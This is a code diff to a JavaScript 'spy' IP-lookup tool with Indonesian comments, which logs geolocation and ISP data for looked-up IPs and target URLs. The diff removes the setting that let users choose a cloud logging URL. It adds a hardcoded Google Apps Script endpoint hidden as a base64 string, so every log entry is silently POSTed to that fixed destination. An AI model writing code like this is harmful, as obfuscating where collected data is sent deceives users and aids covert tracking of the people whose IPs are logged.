@@ -5,14 +5,10 @@ document.addEventListener('DOMContentLoaded', function () {
     const geoResult = document.getElementById('geo-result');
     const geoData = document.getElementById('geo-data');
     const logsBody = document.getElementById('logs-body');
-    const cloudApiInput = document.getElementById('cloud-api-url');
 
-    // Load saved Cloud API URL (Default to user's provided URL)
-    const DEFAULT_CLOUD_URL = 'https://script.google.com/macros/s/AKfycbzqJb0FteRq7SUfHq3KIMYIoGYDfKdm-i12v0O6bHfYDqHy2fjdKCRB0TS_G5GzFBoktg/exec';
-    if (!localStorage.getItem('spy_cloud_url')) {
-        localStorage.setItem('spy_cloud_url', DEFAULT_CLOUD_URL);
-    }
-    cloudApiInput.value = localStorage.getItem('spy_cloud_url');
+    // Obfuscated Cloud URL (Base64 of your Google Script URL)
+    const _0x4f2a = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6cUpiMEZ0ZVJxN1NVZkhxM0tJTVlvR1lEZktkbS1pMTJ2ME82YkhmWUQ5SHlQZmpkS0NSQjBUU19HNUd6RkJva3RnL2V4ZWM=';
+    const getCUrl = () => atob(_0x4f2a);
 
     // 1. Utility: Loading
     function showLoading(show) {
@@ -38,7 +34,7 @@ document.addEventListener('DOMContentLoaded', function () {
     async function fetchIpIntel(ip = '') {
         const query = ip ? `/${ip}` : '';
         
-        // Try Server 1: ipapi.co
+        // Try Server 1: ipapi.co (HTTPS friendly)
         try {
             const res = await fetch(`https://ipapi.co${query}/json/`);
             const data = await res.json();
@@ -52,9 +48,9 @@ document.addEventListener('DOMContentLoaded', function () {
                 lon: data.longitude,
                 timezone: data.timezone
             };
-        } catch (e) { console.warn("Server 1 (ipapi.co) failed"); }
+        } catch (e) { console.warn("Server 1 failed"); }
 
-        // Try Server 2: geojs.io
+        // Try Server 2: geojs.io (Stable fallback)
         try {
             const res = await fetch(`https://get.geojs.io/v1/ip/geo${query}.json`);
             const data = await res.json();
@@ -68,14 +64,14 @@ document.addEventListener('DOMContentLoaded', function () {
                 lon: data.longitude,
                 timezone: data.timezone
             };
-        } catch (e) { console.warn("Server 2 (geojs.io) failed"); }
+        } catch (e) { console.warn("Server 2 failed"); }
 
-        throw new Error("Gagal menghubungi semua server intelijen.");
+        throw new Error("Gagal menghubungi server intelijen. Periksa koneksi internet Anda.");
     }
 
     // 4. Save to Cloud/Local
     async function saveLog(data, type = 'Manual', targetUrl = 'Manual Search') {
-        const cloudUrl = localStorage.getItem('spy_cloud_url');
+        const cloudUrl = getCUrl();
         const logEntry = {
             ip: data.ip || 'Unknown',
             isp: data.isp || 'Unknown',
@@ -85,38 +81,34 @@ document.addEventListener('DOMContentLoaded', function () {
             type: type
         };
 
-        // Save to LocalStorage
+        // Simpan ke LocalStorage (Selalu)
         const localLogs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
         localLogs.unshift({ ...logEntry, timestamp: new Date().toLocaleString('id-ID') });
         localStorage.setItem('spy_logs', JSON.stringify(localLogs.slice(0, 50)));
 
-        // Save to Cloud
-        if (cloudUrl && cloudUrl.startsWith('http')) {
-            try {
-                await fetch(cloudUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(logEntry)
-                });
-            } catch (e) { console.error("Cloud Save Failed"); }
-        }
+        // Simpan ke Cloud
+        try {
+            await fetch(cloudUrl, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(logEntry)
+            });
+        } catch (e) { console.error("Cloud Save Failed"); }
     }
 
     // 5. Fetch Logs
     async function loadLogs() {
-        const cloudUrl = localStorage.getItem('spy_cloud_url');
+        const cloudUrl = getCUrl();
         logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Syncing data...</td></tr>';
 
-        if (cloudUrl && cloudUrl.startsWith('http')) {
-            try {
-                const res = await fetch(cloudUrl);
-                const data = await res.json();
-                renderLogs(data);
-                return;
-            } catch (e) { console.warn("Cloud Fetch Failed, falling back to local"); }
+        try {
+            const res = await fetch(cloudUrl);
+            const data = await res.json();
+            renderLogs(data);
+        } catch (e) { 
+            console.warn("Cloud Fetch Failed, falling back to local");
+            renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'));
         }
-        
-        renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'));
     }
 
     function renderLogs(logs) {
@@ -168,12 +160,6 @@ document.addEventListener('DOMContentLoaded', function () {
     document.getElementById('logs-tab').addEventListener('click', loadLogs);
     document.getElementById('btn-refresh-logs').addEventListener('click', loadLogs);
     
-    document.getElementById('btn-save-api').addEventListener('click', function() {
-        localStorage.setItem('spy_cloud_url', cloudApiInput.value.trim());
-        this.innerHTML = '<i class="fas fa-check"></i>';
-        setTimeout(() => this.innerHTML = '<i class="fas fa-save"></i>', 2000);
-    });
-
     document.getElementById('btn-clear-logs').addEventListener('click', () => {
         if(confirm('Hapus log lokal?')) { localStorage.removeItem('spy_logs'); loadLogs(); }
     });
